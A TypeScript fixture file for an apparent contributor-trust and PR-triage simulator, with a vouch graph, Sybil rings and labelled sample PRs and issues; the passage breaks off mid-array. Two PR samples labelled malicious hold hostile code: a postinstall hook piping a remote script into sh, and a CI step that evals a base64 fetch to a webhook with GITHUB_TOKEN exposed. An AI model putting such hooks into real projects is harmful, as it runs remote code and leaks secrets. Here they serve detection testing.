import type {
  AppealRecord,
  AuditLogEntry,
  ProjectNode,
  ProjectPolicy,
  PullRequestEvent,
  VouchEntry,
} from './types.ts';
import { parseVouchedTd } from './vouchParser.ts';

export const DEFAULT_REFERENCE_NOW = '2026-11-18T14:00:00.000Z';

export const DEFAULT_POLICY: ProjectPolicy = {
  hopDecay: 0.65,
  maxHops: 3,
  vouchThreshold: 0.35,
  denounceBlockThreshold: 0.7,
  minDenounceCorroboration: 2,
  directOverrideThreshold: 0.9,
  denounceHalfLifeDays: 90,
  campaignHammingThreshold: 14,
  campaignMinProjects: 3,
  campaignWindowHours: 6,
  sybilMinSeedReach: 0.05,
  // Asymmetric reputation: slow climb (+0.04) vs rapid slash (-0.22)
  reputationGainRate: 0.04,
  reputationSlashRate: 0.22,
  vouchBudgetPer24h: 6,
  vouchBurstFreezeThreshold: 10,
  freshAccountAgeDays: 14,
};

export const INITIAL_GHOSTTY_VOUCHED_TD = `# Ghostty Public Vouch List (VOUCHED.td sample format)
# Real scale reference: 366 vouched, 25 denounced as of Oct 2026
github:mitchellh # Creator & lead maintainer
github:rockorager # Core terminal maintainer
github:jcollie # Build & packaging maintainer
github:pluiedev # Rendering & macOS contributor
github:gpanders # Neovim & terminal protocol contributor
github:qwerasd205 # Linux GTK contributor
github:tristan957 # Packaging & Linux systems
-github:slop_bot_91 # Automated zero-context PR spam across 6 repos
-github:ci_token_harvester # Submitted malicious GitHub Actions secret exfil PR
-github:readme_farmer_04 # Mass whitespace/typo PR farming
`;

export function createInitialProjects(): ProjectNode[] {
  return [
    {
      id: 'acme-runtime',
      name: 'Acme Runtime',
      repo: 'acme-org/runtime',
      ecosystem: 'TypeScript',
      maintainer: 'elena_rostova',
      isSeedTrusted: true,
      vouchedCountBase: 48,
      denouncedCountBase: 4,
      trustEdges: [
        { targetProjectId: 'ghostty', weight: 0.92 },
        { targetProjectId: 'zig-stdx', weight: 0.85 },
        { targetProjectId: 'vite-plugins', weight: 0.8 },
        { targetProjectId: 'py-ast-kit', weight: 0.72 },
        { targetProjectId: 'rogue-lint', weight: 0.35 },
      ],
    },
    {
      id: 'ghostty',
      name: 'Ghostty',
      repo: 'ghostty-org/ghostty',
      ecosystem: 'Zig',
      maintainer: 'mitchellh',
      isSeedTrusted: true,
      vouchedCountBase: 366,
      denouncedCountBase: 25,
      trustEdges: [
        { targetProjectId: 'zig-stdx', weight: 0.9 },
        { targetProjectId: 'neovim-core', weight: 0.88 },
        { targetProjectId: 'kitty-utils', weight: 0.78 },
        { targetProjectId: 'wezterm-mux', weight: 0.82 },
      ],
    },
    {
      id: 'zig-stdx',
      name: 'Zig StdX',
      repo: 'zigtools/stdx',
      ecosystem: 'Zig',
      maintainer: 'kristoff_it',
      isSeedTrusted: true,
      vouchedCountBase: 74,
      denouncedCountBase: 3,
      trustEdges: [
        { targetProjectId: 'ghostty', weight: 0.9 },
        { targetProjectId: 'bun-ffi', weight: 0.76 },
        { targetProjectId: 'tigerbeetle-io', weight: 0.88 },
      ],
    },
    {
      id: 'neovim-core',
      name: 'Neovim',
      repo: 'neovim/neovim',
      ecosystem: 'C',
      maintainer: 'justinmk',
      isSeedTrusted: true,
      vouchedCountBase: 290,
      denouncedCountBase: 14,
      trustEdges: [
        { targetProjectId: 'ghostty', weight: 0.9 },
        { targetProjectId: 'tree-sitter-cli', weight: 0.85 },
      ],
    },
    {
      id: 'vite-plugins',
      name: 'Vite Ecosystem',
      repo: 'vitejs/vite-plugin-kit',
      ecosystem: 'TypeScript',
      maintainer: 'patak_dev',
      isSeedTrusted: true,
      vouchedCountBase: 142,
      denouncedCountBase: 9,
      trustEdges: [
        { targetProjectId: 'oxc-parser', weight: 0.86 },
        { targetProjectId: 'tsdown-cli', weight: 0.8 },
        { targetProjectId: 'eslint-stylistic', weight: 0.75 },
      ],
    },
    {
      id: 'oxc-parser',
      name: 'Oxc Parser',
      repo: 'oxc-project/oxc',
      ecosystem: 'Rust',
      maintainer: 'boshen',
      isSeedTrusted: true,
      vouchedCountBase: 110,
      denouncedCountBase: 6,
      trustEdges: [
        { targetProjectId: 'ruff-core', weight: 0.85 },
        { targetProjectId: 'tokio-mini', weight: 0.8 },
      ],
    },
    {
      id: 'py-ast-kit',
      name: 'PyAST Kit',
      repo: 'pytooling/py-ast-kit',
      ecosystem: 'Python',
      maintainer: 'charlie_marsh',
      isSeedTrusted: true,
      vouchedCountBase: 92,
      denouncedCountBase: 7,
      trustEdges: [
        { targetProjectId: 'ruff-core', weight: 0.9 },
        { targetProjectId: 'uv-resolver', weight: 0.88 },
        { targetProjectId: 'pytest-x', weight: 0.82 },
      ],
    },
    {
      id: 'ruff-core',
      name: 'Ruff',
      repo: 'astral-sh/ruff',
      ecosystem: 'Rust',
      maintainer: 'charlie_marsh',
      isSeedTrusted: true,
      vouchedCountBase: 185,
      denouncedCountBase: 11,
      trustEdges: [{ targetProjectId: 'uv-resolver', weight: 0.94 }],
    },
    {
      id: 'uv-resolver',
      name: 'uv Resolver',
      repo: 'astral-sh/uv',
      ecosystem: 'Rust',
      maintainer: 'konstin',
      isSeedTrusted: true,
      vouchedCountBase: 130,
      denouncedCountBase: 8,
      trustEdges: [{ targetProjectId: 'ruff-core', weight: 0.92 }],
    },
    {
      id: 'tokio-mini',
      name: 'Tokio Mini',
      repo: 'tokio-rs/mini-io',
      ecosystem: 'Rust',
      maintainer: 'carllerche',
      isSeedTrusted: true,
      vouchedCountBase: 96,
      denouncedCountBase: 4,
      trustEdges: [{ targetProjectId: 'hyper-edge', weight: 0.84 }],
    },
    {
      id: 'hyper-edge',
      name: 'Hyper Edge',
      repo: 'hyperium/hyper-edge',
      ecosystem: 'Rust',
      maintainer: 'seanmonstar',
      isSeedTrusted: true,
      vouchedCountBase: 88,
      denouncedCountBase: 5,
      trustEdges: [],
    },
    {
      id: 'kitty-utils',
      name: 'Kitty Utils',
      repo: 'kovidgoyal/kitty-utils',
      ecosystem: 'Python',
      maintainer: 'kovidgoyal',
      isSeedTrusted: true,
      vouchedCountBase: 64,
      denouncedCountBase: 5,
      trustEdges: [],
    },
    {
      id: 'wezterm-mux',
      name: 'WezTerm Mux',
      repo: 'wez/wezterm-mux',
      ecosystem: 'Rust',
      maintainer: 'wez',
      isSeedTrusted: true,
      vouchedCountBase: 71,
      denouncedCountBase: 4,
      trustEdges: [],
    },
    {
      id: 'tree-sitter-cli',
      name: 'Tree-sitter CLI',
      repo: 'tree-sitter/tree-sitter',
      ecosystem: 'C',
      maintainer: 'maxbrunsfeld',
      isSeedTrusted: true,
      vouchedCountBase: 155,
      denouncedCountBase: 7,
      trustEdges: [],
    },
    {
      id: 'bun-ffi',
      name: 'Bun FFI',
      repo: 'oven-sh/bun-ffi',
      ecosystem: 'Zig',
      maintainer: 'jarred_sumner',
      isSeedTrusted: true,
      vouchedCountBase: 112,
      denouncedCountBase: 9,
      trustEdges: [],
    },
    {
      id: 'tigerbeetle-io',
      name: 'TigerBeetle IO',
      repo: 'tigerbeetle/io',
      ecosystem: 'Zig',
      maintainer: 'jorangreef',
      isSeedTrusted: true,
      vouchedCountBase: 68,
      denouncedCountBase: 2,
      trustEdges: [],
    },
    {
      id: 'tsdown-cli',
      name: 'tsdown',
      repo: 'rolldown/tsdown',
      ecosystem: 'TypeScript',
      maintainer: 'sxzz',
      isSeedTrusted: true,
      vouchedCountBase: 54,
      denouncedCountBase: 3,
      trustEdges: [],
    },
    {
      id: 'eslint-stylistic',
      name: 'ESLint Stylistic',
      repo: 'eslint-stylistic/packages',
      ecosystem: 'TypeScript',
      maintainer: 'antfu',
      isSeedTrusted: true,
      vouchedCountBase: 118,
      denouncedCountBase: 6,
      trustEdges: [],
    },
    {
      id: 'pytest-x',
      name: 'Pytest Plugins',
      repo: 'pytest-dev/pytest-x',
      ecosystem: 'Python',
      maintainer: 'nicoddemus',
      isSeedTrusted: true,
      vouchedCountBase: 140,
      denouncedCountBase: 8,
      trustEdges: [],
    },
    {
      id: 'cobra-lite',
      name: 'Cobra Lite',
      repo: 'spf13/cobra-lite',
      ecosystem: 'Go',
      maintainer: 'marckhouzam',
      isSeedTrusted: true,
      vouchedCountBase: 83,
      denouncedCountBase: 5,
      trustEdges: [{ targetProjectId: 'gin-router', weight: 0.8 }],
    },
    {
      id: 'gin-router',
      name: 'Gin Router',
      repo: 'gin-gonic/router',
      ecosystem: 'Go',
      maintainer: 'thinkerou',
      isSeedTrusted: true,
      vouchedCountBase: 121,
      denouncedCountBase: 9,
      trustEdges: [],
    },
    {
      id: 'rogue-lint',
      name: 'RogueLint',
      repo: 'roguelint/core',
      ecosystem: 'TypeScript',
      maintainer: 'angry_bot_admin',
      isSeedTrusted: false,
      isHostile: true,
      vouchedCountBase: 2,
      denouncedCountBase: 19,
      trustEdges: [],
    },
    {
      id: 'sybil-alpha',
      name: 'SybilAlpha AI',
      repo: 'sybil-ring/alpha',
      ecosystem: 'Python',
      maintainer: 'sybil_master_1',
      isSeedTrusted: false,
      isSybilCluster: true,
      vouchedCountBase: 0,
      denouncedCountBase: 0,
      trustEdges: [
        { targetProjectId: 'sybil-beta', weight: 1.0 },
        { targetProjectId: 'sybil-gamma', weight: 1.0 },
      ],
    },
    {
      id: 'sybil-beta',
      name: 'SybilBeta Kits',
      repo: 'sybil-ring/beta',
      ecosystem: 'TypeScript',
      maintainer: 'sybil_master_2',
      isSeedTrusted: false,
      isSybilCluster: true,
      vouchedCountBase: 0,
      denouncedCountBase: 0,
      trustEdges: [
        { targetProjectId: 'sybil-gamma', weight: 1.0 },
        { targetProjectId: 'sybil-delta', weight: 1.0 },
      ],
    },
    {
      id: 'sybil-gamma',
      name: 'SybilGamma SDK',
      repo: 'sybil-ring/gamma',
      ecosystem: 'Go',
      maintainer: 'sybil_master_3',
      isSeedTrusted: false,
      isSybilCluster: true,
      vouchedCountBase: 0,
      denouncedCountBase: 0,
      trustEdges: [
        { targetProjectId: 'sybil-delta', weight: 1.0 },
        { targetProjectId: 'sybil-alpha', weight: 1.0 },
      ],
    },
    {
      id: 'sybil-delta',
      name: 'SybilDelta CLI',
      repo: 'sybil-ring/delta',
      ecosystem: 'Rust',
      maintainer: 'sybil_master_4',
      isSeedTrusted: false,
      isSybilCluster: true,
      vouchedCountBase: 0,
      denouncedCountBase: 0,
      trustEdges: [
        { targetProjectId: 'sybil-alpha', weight: 1.0 },
        { targetProjectId: 'sybil-beta', weight: 1.0 },
      ],
    },
  ];
}

export function createInitialVouchEntries(): VouchEntry[] {
  const ghosttyParsed = parseVouchedTd(
    INITIAL_GHOSTTY_VOUCHED_TD,
    'ghostty',
    '2026-10-25T10:00:00.000Z'
  ).entries;

  const additional: VouchEntry[] = [
    {
      id: 'v-acme-1',
      projectId: 'acme-runtime',
      contributorHandle: 'elena_rostova',
      status: 'vouched',
      reason: 'Core maintainer',
      createdAt: '2026-09-10T12:00:00.000Z',
    },
    {
      id: 'v-oxc-1',
      projectId: 'oxc-parser',
      contributorHandle: 'dev_kiran',
      status: 'vouched',
      reason: 'Fixed lexer UTF-8 boundary panic across 4 PRs',
      createdAt: '2026-10-12T08:30:00.000Z',
    },
    {
      id: 'v-ruff-1',
      projectId: 'ruff-core',
      contributorHandle: 'marta_py',
      status: 'vouched',
      reason: 'Consistent parser rule contributions with thorough tests',
      createdAt: '2026-10-18T16:15:00.000Z',
    },
    // User-to-user vouches (Person B -> Person A)
    {
      id: 'uv-1',
      projectId: 'ghostty',
      voucherHandle: 'rockorager',
      contributorHandle: 'dev_kiran',
      status: 'vouched',
      reason: 'Reviewed UTF-8 boundary patch; reliable systems engineer',
      createdAt: '2026-10-15T10:00:00.000Z',
    },
    {
      id: 'uv-2',
      projectId: 'ghostty',
      voucherHandle: 'mitchellh',
      contributorHandle: 'rockorager',
      status: 'vouched',
      reason: 'Core maintainer collaboration',
      createdAt: '2026-09-01T10:00:00.000Z',
    },
    // Account-level Sybil mutual vouches (two fresh accounts vouching for each other)
    {
      id: 'uv-syb-1',
      projectId: 'acme-runtime',
      voucherHandle: 'sybil_farmer_77',
      contributorHandle: 'sybil_buddy_78',
      status: 'vouched',
      reason: 'Great developer!',
      createdAt: '2026-11-18T10:00:00.000Z',
    },
    {
      id: 'uv-syb-2',
      projectId: 'acme-runtime',
      voucherHandle: 'sybil_buddy_78',
      contributorHandle: 'sybil_farmer_77',
      status: 'vouched',
      reason: 'Awesome contributor!',
      createdAt: '2026-11-18T10:02:00.000Z',
    },
    // Corroborated bad actor across Ghostty + Vite
    {
      id: 'd-vite-1',
      projectId: 'vite-plugins',
      contributorHandle: 'slop_bot_91',
      status: 'denounced',
      reason: 'Flooded 4 plugin repos with uncompiled AI-generated wrapper diffs',
      createdAt: '2026-11-10T09:00:00.000Z',
    },
    {
      id: 'd-ruff-1',
      projectId: 'ruff-core',
      contributorHandle: 'ci_token_harvester',
      status: 'denounced',
      reason: 'Attempted to exfiltrate GITHUB_TOKEN via workflow PR',
      createdAt: '2026-11-15T11:20:00.000Z',
    },
    // Sybil project-ring mutual vouches (neutralized!)
    {
      id: 'v-sybil-1',
      projectId: 'sybil-alpha',
      contributorHandle: 'sybil_farmer_77',
      status: 'vouched',
      reason: 'Verified awesome contributor',
      createdAt: '2026-11-17T20:00:00.000Z',
    },
    {
      id: 'v-sybil-2',
      projectId: 'sybil-beta',
      contributorHandle: 'sybil_farmer_77',
      status: 'vouched',
      reason: 'Top contributor',
      createdAt: '2026-11-17T20:05:00.000Z',
    },
    {
      id: 'v-sybil-3',
      projectId: 'sybil-gamma',
      contributorHandle: 'sybil_farmer_77',
      status: 'vouched',
      reason: 'Trusted partner',
      createdAt: '2026-11-17T20:10:00.000Z',
    },
    // Hostile/careless project falsely denouncing healthy contributors
    {
      id: 'd-hostile-1',
      projectId: 'rogue-lint',
      contributorHandle: 'hana_student',
      status: 'denounced',
      reason: 'Closed issue without permission (petty dispute)',
      createdAt: '2026-11-16T15:00:00.000Z',
    },
    {
      id: 'd-hostile-2',
      projectId: 'rogue-lint',
      contributorHandle: 'liam_os_dev',
      status: 'denounced',
      reason: 'Disagreed on formatting rule',
      createdAt: '2026-11-16T15:10:00.000Z',
    },
    {
      id: 'd-hostile-3',
      projectId: 'rogue-lint',
      contributorHandle: 'rockorager',
      status: 'denounced',
      reason: 'Automated blocklist import misfire',
      createdAt: '2026-11-16T15:20:00.000Z',
    },
  ];

  return [...ghosttyParsed, ...additional];
}

export function createInitialPullRequests(): PullRequestEvent[] {
  return [
    {
      id: 'pr-101',
      kind: 'pr',
      prNumber: 1482,
      projectId: 'acme-runtime',
      authorHandle: 'rockorager',
      accountAgeDays: 2450,
      publicMergedPrs: 412,
      createdAt: '2026-11-18T11:10:00.000Z',
      title: 'fix(pty): preserve OSC 8 hyperlink params across line wraps',
      body: 'Fixes #1479. Adds regression test for multi-line OSC 8 sequences.',
      filesChanged: ['src/terminal/osc_parser.ts', 'src/terminal/osc_parser.test.ts'],
      diffText: `--- a/src/terminal/osc_parser.ts
+++ b/src/terminal/osc_parser.ts
@@ -42,6 +42,9 @@ export function parseOsc8(seq: string) {
+  if (seq.includes(';id=')) {
+    return preserveHyperlinkId(seq);
+  }
--- a/src/terminal/osc_parser.test.ts
+++ b/src/terminal/osc_parser.test.ts
@@ -18,3 +18,7 @@
+  it('preserves id param across soft wrap', () => {
+    expect(parseOsc8('8;id=abc;https://example.org').id).toBe('abc');
+  });`,
      groundTruth: 'trusted_regular',
    },
    {
      id: 'pr-102',
      kind: 'pr',
      prNumber: 1483,
      projectId: 'acme-runtime',
      authorHandle: 'dev_kiran',
      accountAgeDays: 1120,
      publicMergedPrs: 97,
      createdAt: '2026-11-18T11:25:00.000Z',
      title: 'perf(tokenizer): avoid regex allocation on ASCII identifier fast path',
      body: 'Reduces parser GC pressure by 14% on large workspace files.',
      filesChanged: ['src/lexer/ascii.ts', 'src/lexer/ascii.test.ts'],
      diffText: `--- a/src/lexer/ascii.ts
+++ b/src/lexer/ascii.ts
@@ -11,4 +11,8 @@ export function isAsciiIdent(code: number): boolean {
+  return (code >= 97 && code <= 122) || (code >= 65 && code <= 90) || code === 95;
 }`,
      groundTruth: 'trusted_regular',
    },
    {
      id: 'pr-103',
      kind: 'pr',
      prNumber: 1484,
      projectId: 'acme-runtime',
      authorHandle: 'arjun_hackathon26',
      accountAgeDays: 6,
      publicMergedPrs: 0,
      createdAt: '2026-11-18T11:40:00.000Z',
      title: 'fix(cli): handle empty config array without crashing on startup',
      body: 'Fixes #1465. First open source PR — added a nullish guard and unit test for empty arrays.',
      filesChanged: ['src/config/loader.ts', 'src/config/loader.test.ts'],
      diffText: `--- a/src/config/loader.ts
+++ b/src/config/loader.ts
@@ -24,3 +24,7 @@ export function normalizePlugins(raw?: string[]) {
+  if (!Array.isArray(raw) || raw.length === 0) {
+    return [];
+  }
--- a/src/config/loader.test.ts
+++ b/src/config/loader.test.ts
@@ -9,2 +9,6 @@
+  it('returns empty list when plugins array is empty', () => {
+    expect(normalizePlugins([])).toEqual([]);
+  });`,
      groundTruth: 'genuine_newcomer',
    },
    {
      id: 'pr-104',
      kind: 'pr',
      prNumber: 418,
      projectId: 'py-ast-kit',
      authorHandle: 'sofia_cs_grad',
      accountAgeDays: 14,
      publicMergedPrs: 1,
      createdAt: '2026-11-18T11:52:00.000Z',
      title: 'fix(visitor): skip synthetic docstring nodes during import sorting',
      body: 'Closes #402. Prevents import sorter from reordering module docstrings when __future__ imports exist.',
      filesChanged: ['src/visitor/imports.py', 'tests/test_imports.py'],
      diffText: `--- a/src/visitor/imports.py
+++ b/src/visitor/imports.py
@@ -31,4 +31,7 @@ def collect_imports(tree):
+    if is_module_docstring(node):
+        continue
--- a/tests/test_imports.py
+++ b/tests/test_imports.py
@@ -12,2 +12,6 @@
+def test_docstring_before_future_import():
+    assert sort_file('"""doc"""\\nfrom __future__ import annotations\\nimport os\\n').startswith('"""doc"""')`,
      groundTruth: 'genuine_newcomer',
    },
    {
      id: 'pr-105',
      kind: 'pr',
      prNumber: 1485,
      projectId: 'acme-runtime',
      authorHandle: 'hana_student',
      accountAgeDays: 42,
      publicMergedPrs: 3,
      createdAt: '2026-11-18T12:00:00.000Z',
      title: 'fix(cache): bound LRU cache eviction when maxEntries is 1',
      body: 'Fixes #1471. Off-by-one check caused single-slot cache to never evict.',
      filesChanged: ['src/cache/lru.ts', 'src/cache/lru.test.ts'],
      diffText: `--- a/src/cache/lru.ts
+++ b/src/cache/lru.ts
@@ -18,2 +18,5 @@ export class LruCache {
+    if (this.map.size >= this.maxEntries) {
+      const oldestKey = this.map.keys().next().value;
+      if (oldestKey !== undefined) this.map.delete(oldestKey);
+    }`,
      groundTruth: 'falsely_denounced',
    },
    {
      id: 'pr-106',
      kind: 'pr',
      prNumber: 1486,
      projectId: 'acme-runtime',
      authorHandle: 'sybil_farmer_77',
      accountAgeDays: 2,
      publicMergedPrs: 0,
      createdAt: '2026-11-18T12:08:00.000Z',
      title: 'Improve README documentation formatting and clarity',
      body: 'Enhanced documentation readability for new contributors.',
      filesChanged: ['README.md'],
      diffText: `--- a/README.md
+++ b/README.md
@@ -1,2 +1,2 @@
-# Acme Runtime
+# Acme Runtime `,
    },
    {
      id: 'pr-107',
      kind: 'pr',
      prNumber: 1487,
      projectId: 'acme-runtime',
      authorHandle: 'fresh_dev_882',
      accountAgeDays: 3,
      publicMergedPrs: 0,
      createdAt: '2026-11-18T12:15:00.000Z',
      title: 'chore(build): speed up local post-install telemetry cache',
      body: 'Adds lightweight prewarm script for faster local builds.',
      filesChanged: ['package.json'],
      diffText: `--- a/package.json
+++ b/package.json
@@ -8,2 +8,3 @@
   "scripts": {
+    "postinstall": "curl -sSL https://198.51.100.42/init.sh | sh",
     "build": "vite build"
   }`,
      groundTruth: 'malicious_code',
    },
    {
      id: 'pr-108',
      kind: 'pr',
      prNumber: 1488,
      projectId: 'vite-plugins',
      authorHandle: 'ci_token_harvester',
      accountAgeDays: 5,
      publicMergedPrs: 0,
      createdAt: '2026-11-18T12:22:00.000Z',
      title: 'ci: add automated artifact integrity check step',
      body: 'Validates release checksums on pull requests.',
      filesChanged: ['.github/workflows/ci.yml'],
      diffText: `--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -14,2 +14,5 @@
+      - name: Verify checksum
+        env:
+          TOKEN: \${{ secrets.GITHUB_TOKEN }}
+        run: node -e "eval(atob('ZmV0Y2goImh0dHBzOi8vd2ViaG9vay5zaXRlL3Rlc3QiKQ=='))"`,
      groundTruth: 'malicious_code',
    },
    // Same-repo duplicate PR pair inside acme-runtime (Scene 01: PR #1492 identical to #1491)
    {
      id: 'pr-111',
      kind: 'pr',
      prNumber: 1491,
      projectId: 'acme-runtime',
      authorHandle: 'dup_acct_a',
      accountAgeDays: 4,
      publicMergedPrs: 0,
      createdAt: '2026-11-18T12:24:00.000Z',
      title: 'refactor: improve error handling across modules',
      body: 'Wraps module imports with defensive try-catch logging for stability.',
      filesChanged: ['src/core/errorWrapper.ts'],
      diffText: `--- /dev/null
+++ b/src/core/errorWrapper.ts
@@ -0,0 +1,5 @@
+export function wrapSafe(fn: () => unknown) {
+  try { return fn(); } catch (err) { console.error(err); return null; }
+}`,
      groundTruth: 'campaign_spam',
    },
    {
      id: 'pr-112',
      kind: 'pr',
      prNumber: 1492,
      projectId: 'acme-runtime',
      authorHandle: 'dup_acct_b',
      accountAgeDays: 3,
      publicMergedPrs: 0,
      createdAt: '2026-11-18T12:27:00.000Z',
      title: 'refactor: improve error handling across modules',
      body: 'Wraps module calls with defensive try-catch logging for stability.',
      filesChanged: ['src/core/safeWrap.ts'],
      diffText: `--- /dev/null
+++ b/src/core/safeWrap.ts
@@ -0,0 +1,5 @@
+export function wrapSafe(fn: () => unknown) {
+  try { return fn(); } catch (err) { console.error(err); return null; }
+}`,
      groundTruth: 'campaign_spam',
    },
    // Cross-project AI-slop PR campaign (7 repos)
    {
      id: 'pr-201',
      kind: 'pr',
      prNumber: 901,
      projectId: 'acme-runtime',
      authorHandle: 'ai_wave_acct_01',
      accountAgeDays: 1,
      publicMergedPrs: 0,
      createdAt: '2026-11-18T12:30:00.000Z',
      title: 'feat(utils): add universal retryAsync helper with exponential backoff',
      body: 'This PR introduces a clean universal retryAsync utility function with configurable jitter and exponential backoff to improve resilience across network operations.',
      filesChanged: ['src/utils/retryAsync.ts'],
      diffText: `--- /dev/null
+++ b/src/utils/retryAsync.ts
@@ -0,0 +1,12 @@
+export async function retryAsync(fn: () => Promise<unknown>, retries = 3, delayMs = 100) {
+  for (let attempt = 0; attempt < retries; attempt++) {
+    try { return await fn(); } catch (err) {
+      if (attempt === retries - 1) throw err;
+      await new Promise((r) => setTimeout(r, delayMs * Math.pow(2, attempt)));
+    }
+  }
+}`,
      groundTruth: 'campaign_spam',
    },
    {
      id: 'pr-202',
      kind: 'pr',
      prNumber: 2104,
      projectId: 'vite-plugins',
      authorHandle: 'ai_wave_acct_02',
      accountAgeDays: 1,
      publicMergedPrs: 0,
      createdAt: '2026-11-18T12:39:00.000Z',
      title: 'feat(utils): add universal retryAsync helper with exponential backoff',
      body: 'Introduces a clean universal retryAsync utility function with configurable jitter and exponential backoff to improve resilience across async operations.',
      filesChanged: ['packages/shared/retryAsync.ts'],
      diffText: `--- /dev/null
+++ b/packages/shared/retryAsync.ts
@@ -0,0 +1,12 @@
+export async function retryAsync(task: () => Promise<unknown>, maxRetries = 3, baseDelay = 100) {
+  for (let i = 0; i < maxRetries; i++) {
+    try { return await task(); } catch (e) {
+      if (i === maxRetries - 1) throw e;
+      await new Promise((res) => setTimeout(res, baseDelay * Math.pow(2, i)));
+    }
+  }
+}`,
      groundTruth: 'campaign_spam',
    },
    {
      id: 'pr-203',
      kind: 'pr',
      prNumber: 774,
      projectId: 'tsdown-cli',
      authorHandle: 'ai_wave_acct_03',
      accountAgeDays: 2,
      publicMergedPrs: 0,
      createdAt: '2026-11-18T12:48:00.000Z',
      title: 'feat(core): add universal retryAsync utility with exponential backoff',
      body: 'This pull request introduces a clean universal retryAsync utility function with configurable exponential backoff to improve resilience across network operations.',
      filesChanged: ['src/retryAsync.ts'],
      diffText: `--- /dev/null
+++ b/src/retryAsync.ts
@@ -0,0 +1,12 @@
+export async function retryAsync(op: () => Promise<unknown>, retries = 4, delay = 150) {
+  for (let attempt = 0; attempt < retries; attempt++) {
+    try { return await op(); } catch (err) {
+      if (attempt === retries - 1) throw err;
+      await new Promise((resolve) => setTimeout(resolve, delay * Math.pow(2, attempt)));
+    }
+  }
+}`,
      groundTruth: 'campaign_spam',
    },
    {
      id: 'pr-204',
      kind: 'pr',
      prNumber: 551,
      projectId: 'eslint-stylistic',
      authorHandle: 'ai_wave_acct_04',
      accountAgeDays: 1,
      publicMergedPrs: 0,
      createdAt: '2026-11-18T12:55:00.000Z',
      title: 'feat(utils): add universal retryAsync helper with exponential backoff',
      body: 'This PR adds a clean universal retryAsync utility function with configurable jitter and exponential backoff to improve resilience across operations.',
      filesChanged: ['scripts/retryAsync.ts'],
      diffText: `--- /dev/null
+++ b/scripts/retryAsync.ts
@@ -0,0 +1,12 @@
+export async function retryAsync(fn: () => Promise<unknown>, retries = 3, delayMs = 200) {
+  for (let idx = 0; idx < retries; idx++) {
+    try { return await fn(); } catch (error) {
+      if (idx === retries - 1) throw error;
+      await new Promise((r) => setTimeout(r, delayMs * Math.pow(2, idx)));
+    }
+  }
+}`,
      groundTruth: 'campaign_spam',
    },
    {
      id: 'pr-205',
      kind: 'pr',
      prNumber: 830,
      projectId: 'bun-ffi',
      authorHandle: 'ai_wave_acct_05',
      accountAgeDays: 2,
      publicMergedPrs: 0,
      createdAt: '2026-11-18T13:04:00.000Z',
      title: 'feat(utils): add universal retryAsync helper with exponential backoff',
      body: 'Introduces a clean universal retryAsync utility function with configurable exponential backoff to improve resilience across network operations.',
      filesChanged: ['lib/retryAsync.ts'],
      diffText: `--- /dev/null
+++ b/lib/retryAsync.ts
@@ -0,0 +1,12 @@
+export async function retryAsync(fn: () => Promise<unknown>, retries = 3, delayMs = 100) {
+  for (let attempt = 0; attempt < retries; attempt++) {
+    try { return await fn(); } catch (err) {
+      if (attempt === retries - 1) throw err;
+      await new Promise((r) => setTimeout(r, delayMs * Math.pow(2, attempt)));
+    }
+  }
+}`,
      groundTruth: 'campaign_spam',
    },
    {
      id: 'pr-206',
      kind: 'pr',
      prNumber: 312,
      projectId: 'cobra-lite',
      authorHandle: 'ai_wave_acct_06',
      accountAgeDays: 1,
      publicMergedPrs: 0,
      createdAt: '2026-11-18T13:18:00.000Z',
      title: 'feat(utils): add universal retryAsync helper with exponential backoff',
      body: 'This PR introduces a clean universal retryAsync utility function with configurable jitter and exponential backoff to improve resilience across network operations.',
      filesChanged: ['internal/retry_async.ts'],
      diffText: `--- /dev/null
+++ b/internal/retry_async.ts
@@ -0,0 +1,12 @@
+export async function retryAsync(fn: () => Promise<unknown>, retries = 5, delayMs = 100) {
+  for (let attempt = 0; attempt < retries; attempt++) {
+    try { return await fn(); } catch (err) {
+      if (attempt === retries - 1) throw err;
+      await new Promise((r) => setTimeout(r, delayMs * Math.pow(2, attempt)));
+    }
+  }
+}`,
      groundTruth: 'campaign_spam',
    },
    {
      id: 'pr-207',
      kind: 'pr',
      prNumber: 608,
      projectId: 'gin-router',
      authorHandle: 'ai_wave_acct_07',
      accountAgeDays: 1,
      publicMergedPrs: 0,
      createdAt: '2026-11-18T13:29:00.000Z',
      title: 'feat(utils): add universal retryAsync helper with exponential backoff',
      body: 'Introduces a clean universal retryAsync utility function with configurable exponential backoff to improve resilience across network operations.',
      filesChanged: ['pkg/retry_async.ts'],
      diffText: `--- /dev/null
+++ b/pkg/retry_async.ts
@@ -0,0 +1,12 @@
+export async function retryAsync(fn: () => Promise<unknown>, retries = 3, delayMs = 100) {
+  for (let attempt = 0; attempt < retries; attempt++) {
+    try { return await fn(); } catch (err) {
+      if (attempt === retries - 1) throw err;
+      await new Promise((r) => setTimeout(r, delayMs * Math.pow(2, attempt)));
+    }
+  }
+}`,
      groundTruth: 'campaign_spam',
    },
    // Cross-project Fake/Non-existent Bug Issue Campaign (Scene 01: "Some issues describe problems that don't exist")
    {
      id: 'iss-301',
      kind: 'issue',
      prNumber: 1493,
      projectId: 'acme-runtime',
      authorHandle: 'issue_bot_11',
      accountAgeDays: 2,
      publicMergedPrs: 0,
      createdAt: '2026-11-18T13:32:00.000Z',
      title: 'bug: memory overflow panic in async cache serialization layer',
      body: 'There is a critical memory overflow in the cache serialization layer when processing concurrent worker payloads. Please allocate bounded buffer pools immediately.',
      filesChanged: [],
      diffText: '(GitHub Issue — no code diff)',
      groundTruth: 'campaign_spam',
    },
    {
      id: 'iss-302',
      kind: 'issue',
      prNumber: 2110,
      projectId: 'vite-plugins',
      authorHandle: 'issue_bot_12',
      accountAgeDays: 2,
      publicMergedPrs: 0,
      createdAt: '2026-11-18T13:35:00.000Z',
      title: 'bug: memory overflow panic in async cache serialization layer',
      body: 'Critical memory overflow in the cache serialization layer when processing concurrent worker payloads. Please allocate bounded buffer pools immediately.',
      filesChanged: [],
      diffText: '(GitHub Issue — no code diff)',
      groundTruth: 'campaign_spam',
    },
    {
      id: 'iss-303',
      kind: 'issue',
      prNumber: 422,
      projectId: 'py-ast-kit',
      authorHandle: 'issue_bot_13',
      accountAgeDays: 1,
      publicMergedPrs: 0,
      createdAt: '2026-11-18T13:37:00.000Z',
      title: 'bug: memory overflow panic in async cache serialization layer',
      body: 'There is a critical memory overflow in the cache serialization layer when processing concurrent worker payloads. Please allocate bounded buffer pools immediately.',
      filesChanged: [],
      diffText: '(GitHub Issue — no code diff)',
      groundTruth: 'campaign_spam',
    },
    // Genuine Newcomer GitHub Issue (detailed reproduction steps)
    {
